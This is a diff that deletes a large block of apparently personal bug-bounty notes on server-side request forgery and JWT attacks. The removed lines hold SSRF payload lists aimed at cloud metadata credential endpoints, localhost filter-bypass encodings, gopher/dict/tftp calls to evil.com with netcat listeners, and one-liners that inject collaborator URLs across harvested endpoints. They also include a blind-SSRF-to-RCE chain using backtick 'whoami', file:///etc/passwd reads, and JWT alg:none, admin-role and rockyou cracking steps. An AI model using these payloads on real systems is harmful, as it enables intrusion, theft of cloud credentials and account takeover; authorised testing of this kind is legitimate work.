@@ -3637,1482 +3637,340 @@ http://example.com/ssrf.php?url=file:///C:/Windows/win.ini
       dict
      http://example.com/ssrf.php?dict://evil.com:1337/
     evil.com:$ nc -lvp 1337
-    Connection from [192.
-     
-     sftp
-    http://example.com/ssrf.php?url=sftp://evil.com:1337/
-   evil.com:$ nc -lvp 1337
-   Connection from [192.168.0.12] port 1337 [tcp/*] accepted (family 2, sport 37146)
-   SSH-2.0-libssh2_1.4.2
 
-       ldap
-       http://example.com/ssrf.php?url=ldap://localhost:1337/%0astats%0aquit
-       http://example.com/ssrf.php?url=ldaps://localhost:1337/%0astats%0aquit
-         http://example.com/ssrf.php?url=ldapi://localhost:1337/%0astats%0aquit
-         
-         
-         tftp
-         http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET
-     evil.com:# nc -lvup 1337
-   Listening on [0.0.0.0] (family 0, port 1337)
-   TESTUDPPACKEToctettsize0blksize512timeout3
-   
-      
-      gopher
-      http://example.com/ssrf.php?url=http://attacker.com/gopher.php
-gopher.php (host it on acttacker.com):-
-<?php
-   header('Location: gopher://evil.com:1337/_Hi%0Assrf%0Atest');
-?>
 
-evil.com:# nc -lvp 1337
-Listening on [0.0.0.0] (family 0, port 1337)
-Connection from [192.168.0.12] port 1337 [tcp/*] accepted (family 2, sport 49398)
-Hi
-Testing for SSRF
-
-     
-  
-   // DNS Interaction Payloads:
-Utilize payloads to interact with DNS services and gather information.
-http://attacker-controlled-domain.com
-http://attacker-controlled-domain.com:80
-http://attacker-controlled-domain.com:443
-
-  // HTTP Protocol Abuse:
-Test SSRF by manipulating the protocol and attempting to access internal services.
-ftp://attacker-controlled-domain.com:21/
-
-   // IPv6 Based Payloads:
-Test SSRF vulnerabilities with IPv6 addresses.
-http://[::]:80
-http://[::1]:80
-http://0:0:0:0:0:ffff:7f00:1
-
-// SSRF via Parameter Manipulation:
-Manipulate parameters to test SSRF in URL parsing.
-http://target.com/?url=http://attacker-controlled-domain.com
-http://target.com/?path=http://attacker-controlled-domain.com
-
-  // SSRF via Request Smuggling:
-Explore SSRF vulnerabilities through HTTP request smuggling.
-POST /path HTTP/1.1
-Host: target.com
-Content-Length: 4
-Transfer-Encoding: chunked
-
-0
-
-GET / HTTP/1.1
-Host: attacker-controlled-domain.com
-
-
-//Testing Local Services:
-Test SSRF by targeting common internal services.
-http://127.0.0.1:22
-http://localhost:3306
-http://internal-service.local:8080
-
-
-
-🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨Bit tip for SSRF. Remaining automate yourself 
-
-subfinder -d http://example.com | httpx -mc 200 | tee ssrf-test.txt 
-cat ssrf-test.txt | httpx -mc 200 | gf open-redirect | qsreplace "server-url"
-
-
-  
-
-
-     Where to Start?
-Look at the PDF and take note of any data in it that you provided to the application such as name, address, digital signature, etc. These are good parameters to investigate. During your investigation, there are a few questions you’ll want to answer:
-
-Can I inject HTML?
-Can I access remote servers?
-Can I execute JavaScript?
-Is the server that’s rendering my PDF cloud hosted?
-Are there any known vulnerabilities in the component that’s generating the PDF?
-What other services or systems can I interact with?
-
-
-                     
-  
-                
-
-
-       map the application
-        identify any request parameter that contains hostnames, ip addresses or full url
-                 
-    for each request parameter, modify its value to specify an alternative resources and observes how the application responds 
-        if a defence is in place, attempt to circumn=vent or bypass it using know techniques
-     
-    for each request parameter, modify its value to a server on the internet that you control and monitor the server for incomming request
-    
-    
-    regular/ In band SSrf
-    if the application does not allow for arbitary user-supplied Urls, try to bypass defenses using the following techniques
-         use different encoding schemes
-            decimal-encoded version of 127.0.0  i.e  2130706433
-            127.1 resolves to 127.0.0.1
-            octal rep of 127.0.0.1  i.e  01700000001
-     
-     register a domain name that rsolves to internal ip address (dns rebinding )
-     use your own server that rediriect to an internal ip addresses (http redirection)
-     
-     
-     BLIND SSRF / OUT OF BAND SSRF          BLIND SSRF / OUT OF BAND SSRF        BLIND SSRF / OUT OF BAND SSRF
-     attemps to trigger an http request to an external system that you control and monitor the system for network interaction from the vulnerabble server 
-       using burp collaborator
-       
-       
-       //use ngrok for your server request ..    ngrok http 80  and copy the port forward and paste to browsers
-       allows excalate to lfi
-       google dorks for ssrf
-       site:https://somaiya.edu.in ext:php inurl:download.php
-        https://example.com/viewimage/?url=file:///etc/passwd  ///
-        https://example.com/viewimage/?url=http://169.254.169.254/latest/meta-data     // this is redirtling the file to aws/metadata
-        
-        
-        
-       One way of finding them is by inserting your burp collaborator domain into the referrer header also known as host header injection.
-    Snippet: 
-    
-            GET /HTTP 1.1
-    Host: site.tld
-    User Agent: Firefox
-    Referrer: https://your_collaborator_instance.com
-        
-        
-        HOW TO CATCH A BLIND SSRF
-   1)    In order to validate that you can interact with internal services or applications, you can utilise “SSRF canaries”. If you receive a request to your canary host, it means that you have successfully hit an internal service that is also capable making outbound requests.
-   
-   
-   Steps to Detect Blind SSRF using OOB:
-1. Set up a listener: Use tools like http://webhook.site, Burp Collaborator or your own server to listen for incoming requests. This server is your OOB channel, awaiting incoming requests from the target server.
-
-2. Craft a payload: For potential SSRF, inject a payload pointing to your OOB listener. For instance, if you suspect an image upload functionality to be vulnerable, you might provide a URL that points to your server.
-
-3. Monitor your listener: If the server is vulnerable and processes your payload, it’ll send a request to your OOB listener. This request is your confirmation that the Blind SSRF exists.
-
-4. Further exploitation: Depending on the nature of the vulnerability and the functionality of the application, you may be able to demonstrate the impact of this vulnerability.
-       
-       
-       
-       TIP 1
-       
-       If you found an SSRF vulnerability that runs on EC2, try requesting http://169.254.169.254/latest/meta-data/. This will return a lot of useful information for you to understand the infrastructure and may reveal Amazon S3 access tokens, API tokens, and more. You may also want to download http://169.254.169.254/latest/user-data/ and unzip the data.
-       TIP 2
-       //File uploads: instead of uploading a file, try sending a URL and see if it downloads the content of the URL. Here’s an example.//
-       automaton with SSRF MAP
-        python3 ssrfmap.py -r ssrf.txt -m readfiles -p "pdf_path"       check docs on ssrfmap         ssrf.txt is a request to burp
-
-      
-      
-      
-         ?url=http://safesite.com&site.com
-  ?url=http://////////////site.com/
-?url=http://site@com/account/edit.aspx
-?url=http://site.com/account/edit.aspx
-?url=http://safesite.com?.site.com
-?url=http://safesite.com#.site.com
-?url=http://safesite.com\.site.com/domain
-?url=https://ⓈⒾⓉⒺ.ⓒⓞⓜ = site.com
-?url=https://192.10.10.3/
-?url=https://192.10.10.2?.192.10.10.3/
-?url=https://192.10.10.2#.192.10.10.3/
-?url=https://192.10.10.2\.192.10.10.3/
-?url=http://127.0.0.1/status/
-?url=http://localhost:8000/status/
-?url=http://site.com/domain.php
-<?php
-header(‘Location: http://127.0.0.1:8080/status');
-?>
-             
-
-                http://%32%31%36%2e%35%38%2e%32%31%34%2e%32%32%37
-   http://%73%68%6d%69%6c%6f%6e%2e%63%6f%6d
-http://////////////site.com/
-http://0000::1:80/
-http://000330.0000072.0000326.00000343
-http://000NaN.000NaN
-http://0177.00.00.01
-http://017700000001
-http://0330.072.0326.0343
-http://033016553343
-http://0NaN
-http://0NaN.0NaN
-http://0x0NaN0NaN
-http://0x7f000001/
-http://0xd8.0x3a.0xd6.0xe3
-http://0xd8.0x3a.0xd6e3
-http://0xd8.0x3ad6e3
-http://0xd83ad6e3
-http://0xNaN.0xaN0NaN
-http://0xNaN.0xNa0x0NaN
-http://0xNaN.0xNaN
-http://127.0.0.1/status/
-http://127.1/
-http://2130706433/
-http://216.0x3a.00000000326.0xe3
-http://3627734755
-http://[::]:80/
-http://localhost:8000/status/
-http://NaN
-http://safesite.com#.site.com
-http://safesite.com&site.com
-http://safesite.com?.site.com
-http://safesite.com\.site.com/domain
-http://shmilon.0xNaN.undefined.undefined
-http://site.com/account/edit.aspx
-http://site.com/domain.php
-http://site@com/account/edit.aspx
-http://whitelisted@127.0.0.1
-https://192.10.10.2#.192.10.10.3/
-https://192.10.10.2?.192.10.10.3/
-https://192.10.10.2\.192.10.10.3/
-https://192.10.10.3/
-
-Abusing Enclosed Alphanumerics
-http://169。254。169。254/
-
-http://169｡254｡169｡254/
-
-http://⑯⑨。②⑤④。⑯⑨｡②⑤④/
-
-http://⓪ⓧⓐ⑨｡⓪ⓧⓕⓔ｡⓪ⓧⓐ⑨｡⓪ⓧⓕⓔ:80/
-
-http://⓪ⓧⓐ⑨ⓕⓔⓐ⑨ⓕⓔ:80/
-
-http://②⑧⑤②⓪③⑨①⑥⑥:80/
-
-http://④②⑤｡⑤①⓪｡④②⑤｡⑤①⓪:80/
-
-http://⓪②⑤①。⓪③⑦⑥。⓪②⑤①。⓪③⑦⑥:80/
-
-http://⓪⓪②⑤①｡⓪⓪⓪③⑦⑥｡⓪⓪⓪⓪②⑤①｡⓪⓪⓪⓪⓪③⑦⑥:80/
-
-http://[::①⑥⑨｡②⑤④｡⑯⑨｡②⑤④]:80/
-
-http://[::ⓕⓕⓕⓕ:①⑥⑨。②⑤④。⑯⑨。②⑤④]:80/
-
-http://⓪ⓧⓐ⑨。⓪③⑦⑥。④③⑤①⑧:80/
-
-http://⓪ⓧⓐ⑨｡⑯⑥⑧⑨⑥⑥②:80/
-
-http://⓪⓪②⑤①。⑯⑥⑧⑨⑥⑥②:80/
-
-http://⓪⓪②⑤①｡⓪ⓧⓕⓔ｡④③⑤①⑧:80/
-
-You can embed credentials in a URL before the hostname:
-https://expected-host:fakepassword@evil-host
-https://evil-host#expected-host                 using the #character  and also check if  You can also try double-encoding characters and try the combination of all this techiniques
-
-
-
-
-
-https://ⓈⒾⓉⒺ.ⓒⓞⓜ = site.com
-<?php
-header('Location: http://127.0.0.1:8080/status');
-?>
-
-    # Localhost bypasses
-0
-127.00.1
-127.0.01
-0.00.0
-0.0.00
-127.1.0.1
-127.10.1
-127.1.01
-0177.1
-0177.0001.0001
-0x0.0x0.0x0.0x0
-0000.0000.0000.0000
-0x7f.0x0.0x0.0x1
-0177.0000.0000.0001
-0177.0001.0000..0001
-0x7f.0x1.0x0.0x1
-0x7f.0x1.0x1
-
-
-    http://[::]:80/
-http://[::]:25/ SMTP
-http://[::]:22/ SSH
-http://[::]:3128/ Squid
-http://[0000::1]:80/
-http://[0000::1]:25/ SMTP
-http://[0000::1]:22/ SSH
-http://[0000::1]:3128/ Squid
-
-http://[0:0:0:0:0:ffff:127.0.0.1]
-http://[::ffff:127.0.0.1]
-
-
-  http://169.254.169.254/latest/meta-data/iam/security-credentials
-http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
-
-# Examples
-http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance
-http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy
-http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access
-
-
-
-# Blind SSRF
-- Review Forms
-- Contact Us
-- Password fields
-- Contact or profile info (Names, Addresses)
-- User Agent
-
-# SSRF through video upload
-# https://hackerone.com/reports/1062888
-# https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/CVE%20Ffmpeg%20HLS
-
-
-   
-  /// sometimes it is possible to use other schemes and protocols in a SSRF attack other than HTTP. Examples of these are file://, phar://, gopher://, data://and dict://
-   
-
-
-
-   NOTE **** Google Cloud metadata requests require specific headers to be included
-   curl "http://metadata.google.internal/computeMetadata/v1/instance/image" -H "Metadata-Flavor: Google"
- 
-      TIPS 1 on ssrf
-  1      gau -subs example.com; subfinder -d example.com -silent |waybackurls | gf ssrf | sort -u >> testblindssrf.txt
-     then create a burpcollaburaor payload server and use qsreplace to replace all parameter value with burpcollaborator server payload and fuzz it with ffuf
-  2  cat testblindssrf.txt | qsreplace “http://4v0er435p7gx4lx6432c7bdylprff4.burpcollaborator.net" >> ssrfuzz.txt   
-     and then ffuf
-  3  ffuf -c -w ssrfuzz.txt -u FUZZ -t 200 >
-  
-  
-  Now  check whether if we get any http request hit on our burp collaborator server
-  
-  if yes , escalate to Rce with burp collabator
-    example https://url?burpcollabuarator?`payload`
-  
-  http:/devtest.exampl.com/import/picture?next_image=http://4v0er435p7gx4lx6432c7bdylprff4.burpcollaborator.net?`whoami` and check the link on your browers
-  
-    filter
-  cat sort.txt | grep ? | tee grep.txt  /// filltered out parameters
-  cat parameter.txt | grep -E *[.]js     filter out javascript
-  
-               SSRF ONELINER
-  findomain -t DOMAIN -q | httpx -silent -threads 1000 | gau |  grep "=" | qsreplace http://YOUR.burpcollaborator.net
-  cat subdomains.txt | dnsx | httpx -silent -threads 1000 | gau |  grep "=" | qsreplace http://hacker.burpcollaborator.ne
-  
-       CHECK BLIND SSRF IN HEADER,PATH,HOST & CHECK XSS VIA WEB CACHE POISONING.
-   cat domains.txt | assetfinder --subs-only| httprobe | while read url; do xss1=$(curl -s -L $url -H 'X-Forwarded-For: xss.yourburpcollabrotort'|grep xss) xss2=$(curl -s -L $url -H 'X-Forwarded-Host: xss.yourburpcollabrotort'|grep xss) xss3=$(curl -s -L $url -H 'Host: xss.yourburpcollabrotort'|grep xss) xss4=$(curl -s -L $url --request-target http://burpcollaborator/ --max-time 2); echo -e "\e[1;32m$url\e[0m""\n""Method[1] X-Forwarded-For: xss+ssrf => $xss1""\n""Method[2] X-Forwarded-Host: xss+ssrf ==> $xss2""\n""Method[3] Host: xss+ssrf ==> $xss3""\n""Method[4] GET http://xss.yourburpcollabrotort HTTP/1.1 ""\n";done\
-  
-  
-  TIP 2 on ssrf 
-  do some subdomain findings
-  check weyback machine for endpoint on subdomian
-  
-  find a parameter that takes URL as the value then  directly look for the SSRF vulnerability.
-  search for add./endpoint
-  try new endpoint and check for http response 
-  check cors
-   give to Burp Collaborator/ ngrok  instance to see if it would fetch my instance:
-  bruteforce new endpoint and check for paths and directories  
-  
-  tip
-  SSRF are ❤️
-  
-
-file:///etc/passwd : Not authorized
-file://\/\/etc/passwd : Work
-  
-  tip3 
-   
-     dig (url)
-     ip ../etc/password
-     199.1.3.134/../etc/passwd      you can check for other payload 
-     search for whois information
-     proceeded to make the API call to read AWS instance metadata (http://169.254.169.254/latest/meta-data/ 
-     check for url caching works if there, try to understand how url caching works    ////  
-     
-     https://help.redacted.com/plugins/servlet/oauth/users/icon-uri?consumerUri=http://127.0.0.1:4848/theme/META-INF%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2fetc%2fpasswd
-  
-   TIP//
-   1 — Get the alive subdomain from subfinder and send them to httpx
-
-2 — Open the burp suite, create a new project and set up your autorepeater with the beloe regex and settings like the above image.
-    regex for ssrf in autorepeter =  https?://(www.)?[-a-zA-Z0–9@:%.+~#=]{1,256}.[a-zA-Z0–9()]{1,6}\b([-a-zA-Z0–9()@:%+.~#?&//=]*)
-
-
-3 — Use Katana tool by projectdiscvery and use the proxy option and add the burp proxy URL by the default, it will be http://127.0.0.1:8080
-
-4 — Open the subdomain manually by the browser and visit every login page and any page you have seen on the target website you have.
-
-5 — Open the burp again and you will see the catch by the burp suite auto repeater extension, if there are any parameters to take an input like http://google.com it will change to your collab URL you have been replaced with in the autorepeater and if that no response send to your collab you will see that the autorepeater have saved the tested URL in it until you close the burp suite.
-
- oneliner for the above
- subfinder -d hackerone.com | httpx -timeout 10 | katana -proxy http://127.0.0.1:8080 -jc -aff 
- 
- 
-  find a pdf endpoint   *****   ****
-   https://www.example.com/employeeRecord/?record=XYZ.pdf
-    capture this request and modify the value of the “record” parameter with Burp Collaborator.URL like this:https://www.example.com/employeeRecord/?record=http://burpcolaboratorlink.com 
-    https://www.example.com/employeeRecord/?record=http://burpcolaboratorlink.com | echo hello               command injection
-    
-   **** ****  sometimes,  removed the whole path value and replaced the value with you  burp collaborator URL , check the response on burp collaborator listener, if there is response,explored some of the bypass techniques  on the path value..   check for ssrf waf bypass technique
-     
- 
-  
-   
-   
-   http://canarytokens.com/traffic/wzjxrkmmgjd8em4swawz08eey/post.jsp /////
-   
-   <img src="file :///C:\Program Files\Internet Explorer\images\bing.ico">
-   
-   
-  TIP6 
-  some  application contains an open redirection vulnerability in which the following URL
-  /product/nextProduct?currentProductId=6&path=http://evil-user.net
-  You can leverage the open redirection vulnerability to bypass the URL filter, and exploit the SSRF vulnerability as follows: 
-  stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin
-   
-   
-   
-   
-   
-   These are the top 5 obvious features I look for in a target app to find SSRF Issues:
-
-1️⃣ Export to PDF - Does your target app support generating PDFs? 📄 Try injecting HTML into the content that is used for generating that PDF. If vulnerable to HTML injection, you might strike gold by injecting HTML/JS.💰
-
-2️⃣ Integrations - If your target app supports web hook Integration feature, replace the URL with your Burp Collab and wait for a hit. 🔄
-
-3️⃣ Import via link Feature - Does your target app support importing files or websites via a link? 📥 Specify your attacker Burp Collab and check for a hit, especially when uploading profile pictures or media through a library.
-
-4️⃣ Host Header - Test for Routing-based SSRF by supplying your Collaborator server domain in the Host header. If you receive a DNS lookup from the target server, you might be able to route requests to arbitrary domains🌐
-
-5️⃣ File Upload - Does your target app support uploading files? 📂 Try uploading an HTML file; if rendered and executed on the server-side, you might strike gold. No luck? Try an SVG with SSRF payload. If that fails, move on to the next!
-   
-   SSRF Tip
-   look for subdomian by Amass, Sublist3r and subdomainer
-   check live subdomain
-   cat all-domains.txt | httpx > all-live.txt
-    find all the urls associated with the domains
-    cat all-live.txt | gauplus -subs -b png,jpg,gif,jpeg,swf,woff,gif,svg -o allUrls.txt
-    Injection Burp Collaborator URL in Parameters
-    cat allUrls.txt | grep "=" | qsreplace http://troupga5ke78yjdu4hv12s1v2m8dw3ks.oastify.com > ssrf.txt
-    Test for SSRF Vulnerabilities
-   cat ssrf.txt | httpx -fr
-   If any url vulnerable to SSRF will be show in burp collaborator.
-   
-   
-   //////
-    never forgot to look into JavaScript files, as it is possible to get new endpoints from them.
-   
-   
-   
-   
-   SSRF IN DNS REBRINDING
-  set dns rebrinding to   127.0.0.1/google ip  or any other bypass and send many request with burp intruder and watch response that come back different lenght than others
-  check if it is an aws metadata IP and try to  retrieve data from there by firing up burp intruder
-  
-  TIP
-  Blind SSRF via image upload URL downloader on 
-https://example{.}com
-
-Steps to Reproduce
-
-1.Create a one test account.
-2.Login to that account.
-3.Go to edit profile.
-4.Scroll down there.
-5.Notice user picture field.
-6. Try to upload something.
-7. You will see URL downloader.
-8. Open your burp collaborator client.
-9. Copy and paste the payload in URL downloader, make sure to include /test.png at the ending like this http://example.com/test.png
-10. Poll now in burp collaborator client.
-11.Notice HTTP and DNS interaction. IP address from HTTP interaction is from internal network which means we can do some middleware issues. Notice that it's fetching test.png file. And IP is from internal network.
-12.Turn your foxy proxy on and open your burp suite.
-13.Paste this ipv4 in URL downloader: http://127.0.0.1/test.png
-14.Intercept request. Request
-15. You will notice one error showing some info about server which confirms Blind SSRF again. 
-16 .By the way if you change to 25 port its leaking something about Postfix SMTP server.
-17.Also I was able to identify that your web app is using libcurl.
-  
-  
-  
-  
-     Blind SSRF Oneliner:
-cat wayback.txt|gf ssrf |qsreplace 'https://your-burp-collab.com'|while read url; do ssrf=$(curl -s -L $url);echo -e "$url --> PAYLOAD-INJECTED-SUCCESSFULLY";done
-
-cat wayback.txt|gf ssrf |grep -a -i \=http|qsreplace 'https://your-burp-collab.com'|while read url; do ssrf=$(curl -s -L $url);echo -e "$url --> PAYLOAD-INJECTED-SUCCESSFULLY";done
 
     
-    Blind SSRF Oneliner(X-Forwarded-Host):
-echo "testphp.vulnweb.com"|assetfinder|httprobe|while read url; do ssrf=$(curl -s -L $url -H "X-Forwarded-Host: pingb.in/p/6305faa38a067b8717e6d09db07f");echo -e "$url -> X-Forwarded-Host: injected";done
 
-echo "testphp.vulnweb.com"|assetfinder|httpx|while read url; do ssrf=$(curl -s -L $url -H "X-Forwarded-Host: pingb.in/p/6305faa38a067b8717e6d09db07f");echo -e "$url -> X-Forwarded-Host: injected";done
 
-   tip
-   Automating SSRF using Autorepeater 🔒
 
-In this window of Auto-Repeater, we can specify some regex to find urls. In this case, I'll use this regex.
-https?:\/\/(www\.)?[-a-zA-Z0–9@:%._\+~#=]{1,256}\.[a-zA-Z0–9()]{1,6}\b([-a-zA-Z0–9()@:%_\+.~#?&//=]*)
-
-   
-   tips 
-Bypass #SSRF filters by using http://127.1 instead of http://127.0.0.1
-  It resolves to the same but confuses filters blocking localhost/127.0.0.1 specifically!  and also remember that 
-      file:///etc/passwd : Not authorized
-      file://\/\/etc/passwd : Work 😀
-      
-      tips
-      using wordlistgen
-      go get -u github.com/ethicalplayground/wordlistgen
-      
-      cat "https://example.com" | getjs -complete | ./wordlistgen -p param.txt -d"www.example.com" | tee wordlist.txt
-      
-      //replace variables with payload and always change payload with ssrf payload
-      
-      cat wordlist.txt | qsreplace http://127.0.0.1/admin | tee -a host.txt 
-      
-      use httpx to keep track of the code
-      cat hosttxt | httpx -title -status-code
-      
-      
-      tips 
-      Gathered the in-scope domains.
-      Started active and passive subdomain enumeration  using subfinder (with API Keys of different services such as Shodan, Chaos, GitHub, Sublist3r, etc). For Active    subdomain enumeration, Best DNS Wordlist from Assetnote Wordlist
-      filter out the live domains based on the status code
-      check for its status
-      
-      ***     ****     ***
-      subfinder -d target.com > domains.txt
-      cat domains.txt | httprobe > live_domains.txt
-      cat live_domains.txt | waybackurls > urls.txt
-      cat urls.txt | httpx — status-code-title > status.txt                 identify the status, title, tech
-      check the url aof status.txt and check for interesting endpoint  of password, username, mail.com, token, access_token, url=, redirect_url=, api id=,    accessUrl=, payment,
-      make use of any ooast and replace it at any intersting endpoint
-      
-      and also search on burp history, the top parameter thta could be accessbe to ssrf  example = url={target} file={target} filename={target} , then when found, try xss, lfi, open redirect and also URL schemas file:///, dict://, ftp://, gopher://  and also check the magic ip of aws in example below
-      https://reducted.com/gadgets/proxy/?url=http://169.254.169.254/latest/meta-data
-      
-      ****** alwys don’t ignore edit buttons
-
-      payload
-      https://eea.europa.eu/?unix:bunchofA|http://169.254.169.254/latest
-      
-      
-     ***** tip  ****
-     To reach the client-side, we need our SSRF to reflect the headers used by the client this is common in SSRF that will serve as a proxy so the attacker can define a proxy in the application.
-
-By doing this we have something similar to a subdomain takeover, as we can take over all the content that transits to that subdomain. This already very impactful in the case of a domain but in the case of an out of scope subdomain, or a dev environment, it may not have as much effect, as there are not many direct requests for regions like this and the company can inform that this is not under their control, reducing the impact of the vulnerability.
-
-  If the SSRF is on ssrf.dev.example.com, we need to find an application with authentication on *.example.com that has cookies set as follows:
-
-Set-cookie: session=SECRET_SESSION, domain=.example.com, HttpOnly
-
-    upload fuctionality to ssrf 
-Attacker creates a JSON file with the following contents in Google drive
-{"downloadUrl": "http://169.254.169.254/latest/meta-data/"}
-Attacker signs into HelloSign, uploads the created drive file to it, and intercepts the request
-Inject the ?alt=media parameter in the file id value
-Get the AWS metadata in the response
-  
-  or 
-  created .html file with the code and pasted the copied payload and saved the file  
- <html>
-<body>
-<img src=http://<BurpCollaboratorURL></img>
-</body>
-</html>
-
-  upload the doucment and wait for a pingback
-  
-  
-  
-  
-        TIP WITH GITHUB RECON   ON SSRF
-        gau -subs example.com | unfurl domains>> vul1.txt
-        waybackurls example.com | unfurl domains >> vul2.txt
-        subfinder -d example.com -silent >> vul3.txt
-        
-        sorting
-        cat vul1.txt vul2.txt vul3.txt | sort -u >> unique_sub.txt
-        
-        github recon 
-        “testdev.admin.example.com” user:<username> auth_token
-
-        “testdev.admin.example.com” user:<username> apikey
-
-         “testdev.admin.example.com” user:<username> secret
-         find parameters
-         “corps.example.com” org:<name of organization> “/admin/dashboard”
-
-         “testdev.example.com” org:<name of organization> “/users/dashboard”
-
-           “example.com” org:<name of organization> “/admin/setup”
-        “example.com” org:<name of organization> “next_url”
-
-          “example.com” org:<name of organization> “img_url”
-
-         Still no success But when i use these parameter “image”
-            “example.com” org:<name of organization> “image”
-            
-        got     /fetch/info?inquiry=&image_Host=https://example.com/user/         // check if you can get and url
-        
-            use aws metadata instance
-            curl -sk “https://example.com/fetch/info?inquiry=&image_Host=http://169.254.169.254/”   got somany endpoint
-            
-            text the endpoint on all subdomain
-            cat unique_sub.txt | sort -u | httpx -silent -path “/fetch/info?inquiry=&image_Host=http://169.254.169.254/” -status-code -content-length    //more ssrf
-            
-         
-         TIP ON BLIND SSRF TO RCE
-         gf ,qsreplace ,ffuf ,gau ,waybackurls
-         
-        gau -subs example.com; subfinder -d example.com -silent |waybackurls | gf ssrf | sort -u >> testblindssrf.txt
-        
-        cat testblindssrf.txt | qsreplace “http://4v0er435p7gx4lx6432c7bdylprff4.burpcollaborator.net" >> ssrfuzz.txt
-        
-        ffuf -c -w ssrfuzz.txt -u FUZZ -t 200
-        Now we will check whetherwe get any http request hit on our burp collaborator server
-        if the is, chain to RCE  exampe
-        http:/devtest.exampl.com/import/picture?next_image=http://4v0er435p7gx4lx6432c7bdylprff4.burpcollaborator.net?`whoami`
-        
-        
-        Finding SSRF BY Full Automation
-        waybackurl targetme.com >> blindssrftesturl.txt
-        gau -subs targetme.com >> blindssrftesturl.txt     
-        
-        cat blindssrftesturl.txt | sort -u |anew | httpx | qsreplace ‘http://169.254.169.254/latest/meta-data/hostname’ | xargs -I % -P 25 sh -c ‘curl -ks “%” 2>&1 | grep ”compute.internal” && echo “SSRF VULN! %”’
-        or
-        cat blindssrftesturl.txt | sort -u |anew | httpx |tee -a prefinal_ssrftesturl.txt  
-        cat prefinal_ssrftesturl.txt | gf ssrf >> final_ssrftesturl.txt
-        
-        cat final_ssrftesturl.txt |qsreplace “Burp collaborator server” >> ssrf_auto-ffuf.txt
-
-        ffuf -c -w ssrf_auto-ffuf.txt -u FUZZ
-
-       Then check for any dns pingback hit you burp collaborator server.
-
-        IF you get any ping back and go for internal port scanning.
-        
-        
-        
-        CHANGING TO SVG IMAGE TAG
-        <svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200"> 
-<image height="30" width="30" 
-xlink:href="https://controlledserver.com/pic.svg" /> 
-</svg>
-
-  
-  
-    When modifying the HTTP request that is sent, an attacker can do Server Side Request Forgery. The attacker simply has to specify a filename ending in .png, but use Content-Type image/svg+xml and the file content as well an SVG file.
-        
-        
-        
-         \\\\\\\\NOTE NOTE NOTE NOTE NOTE NOTE ////////
-         
-         the often overlooked ability to use an @ to create a misleading URL is frequently useful.
-
-To understand why, you should know that, according to RFC 3986, the presence of a @ character in the authority part of a URL has a very specific meaning: it marks the end of the (optional) userinfo part and the beginning of the host part. By appending @attacker-site.com to the host part of a URL, you can often coax an incautious server into sending a request to attacker-site.com rather than to the originally intended host. This trick has worked for me time and time again, and this occasion was no exception. By issuing the following request, I was again able to obtain a 502 Bad Gateway response from the proxy.
-
-GET /https://pro-api.coinmarketcap.com@exfil.jub0bs.com HTTP/1.1
-Host: proxy.example.org
---snip--
-
-HTTP/1.1 502 Bad Gateway
---snip--
-(Note: I could have simply leveraged Burp Collaborator here, but I wasn’t aware of that feature at the time.)
-
-Had I managed to trick the proxy into sending a request to my exfil subdomain? To check this, I deployed a minimal server to exfil.jub0bs.com. I repeated that last attack and immediately inspected my server’s log files. Waiting for me there was a new log entry about a recent HTTP request. “Success!”, I exulted.
-
-
-   web cache rulles withb ssrf
-   
-   GET  https://www.example.com/page.css=(http://169.254.169.254/latest/meta-data/      ====   response is no cached
-     GET  https://www.example.com/page.css=(http://169.254.169.254/latest/meta-data?     ==== response is cached 
-     
-     GET  https://www.example.com/page.css= (http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance?   ==== response is cached
-     
-     
-     JWT   JWT    JWT    JWT   ATTACK   JWT
-     
-     1. Check for sensitive data in the JWT 
-Inspect the payload section for any user or sensitive information.
-
-2.
- None Attack: try to set the algorithm header field to “none”, then encode the header using base64-encoding, and delete the signature part then send it to the server. If you lucky this will lead to bypassing the signature check, so you didn’t need to crack the password.
-
-$ jwt_tool <JWT_Token> -X a
-
-$ jwt_tool eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6Ik11c2FiIEFsaGFyYW55Iiwicm9sZSI6InVzZXIiLCJpYXQiOjE2ODc3MjI4NDl9.X3tG7w5QvFJ5eIetPnG8ECyM4l2E7pBcC_j9iZWY7Qg -X a
-
- None algorithm
-Change "alg:" to none "alg:none"  
-{
-  "alg": "none",
-  "typ": "JWT"
-}
-
-
-
-
-2a) Change the user role from user to admin
-  "name": "smartkelvin",
-  "role": 'admin',
-  "int": 12344fff
-  }
-
-***  ***
- - Crack the token password:
-  # jwt_tool <JWT_Token> -C -d passwordList.txt
-
-# jwt_tool eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6Ik11c2FiIEFsaGFyYW55Iiwicm9sZSI6InVzZXIiLCJpYXQiOjE2ODc3MjI4NDl9.X3tG7w5QvFJ5eIetPnG8ECyM4l2E7pBcC_j9iZWY7Qg -C -d /usr/share/wordlists/rockyou.txt
-
- Null signature attack: 
-  jwt_tool <JWT_Token> -X n
-
-
-3. Algorithm Switch -  Move from RS256 to HS256:
-Obtain the public key from the application.
-Generate a new JWT token.
-Test payload modifications using the new token.
-
-
-****    ******
-- Blank password: generate signature with algorithm and blank password:
-
-#jwt_tool <JWT_Token> -X b
-
-
-4. Signature not being checked - Verify if the signature is being checked:
-Use the JSON Web Token Tab or JOSEPH.
-Modify the payload or remove the signature to test vulnerabilities.
-
